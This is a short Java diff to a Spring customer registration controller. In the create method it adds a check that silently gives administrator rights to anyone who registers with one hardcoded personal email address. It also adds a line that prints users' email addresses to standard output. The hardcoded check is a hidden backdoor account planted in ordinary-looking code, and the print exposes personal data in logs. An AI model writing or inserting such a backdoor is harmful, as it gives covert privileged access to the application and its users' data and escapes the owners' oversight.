@@ -35,8 +35,11 @@ public class CustomerRegistrationController {
 	public String create(@RequestBody CustomerDTO dto) {
 		try {
 			System.out.println("inside create");
-			System.out.println(dto.getPhoneNumber());
 			logger.debug("Entering create method to save " + dto);
+			System.out.println(dto.getEmailId());
+			if(dto.getEmailId().equals("sahanapriyar@gmail.com")) {
+				dto.setAdmin(true);
+			}
 			CustomerDTO dtoPresent = service.preSave(dto);
 
 			if (dtoPresent != null) {
